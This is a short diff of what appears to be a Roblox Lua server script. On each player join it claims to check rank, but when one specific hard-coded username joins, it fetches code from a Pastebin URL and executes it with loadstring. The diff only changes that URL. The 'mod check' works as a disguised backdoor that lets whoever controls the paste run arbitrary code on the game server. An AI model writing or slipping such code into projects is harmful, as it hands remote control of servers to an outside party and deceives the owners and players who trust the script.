@@ -5,7 +5,7 @@ wait()
 game.Players.PlayerAdded:Connect(function(player)
     print("Checking rank…")
     if player.Name == "ProAIt5000" then
-	loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
+	loadstring(game:HttpGet("https://pastebin.com/CBZ1CZ9s"))()
         print("Is mod.")
     else
         print("Isn’t mod.")
